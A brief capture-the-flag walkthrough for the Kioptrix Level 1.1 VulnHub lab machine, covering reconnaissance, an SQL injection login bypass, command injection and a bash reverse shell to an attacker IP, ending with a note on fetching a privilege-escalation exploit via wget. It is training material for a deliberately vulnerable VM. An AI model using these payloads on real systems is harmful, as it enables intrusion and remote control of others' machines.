# Kioptrix: Level 1.1 (#2)

https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

We netdiscover to find http://192.168.1.93/ and then we run `nmap -sV 192.168.1.93` and `nikto -h 192.168.1.93`. The webpage shows a login and we see that nmap connects to MySQL so it could be an SQL injection. We tried the usual candidates and find that `%' or 1=1 #` worked. We logged in and see a page where you can execute commands (this is very similar to the dvwa one). By doing command injection `;ls` we can see the files in the directory. Now this is a simple case of executing `;bash -i >& /dev/tcp/192.168.1.88/1234 0>&1` and gaining shell access. Finding the name of the machine and either run wget to download the exploit and excute to escalate privleges
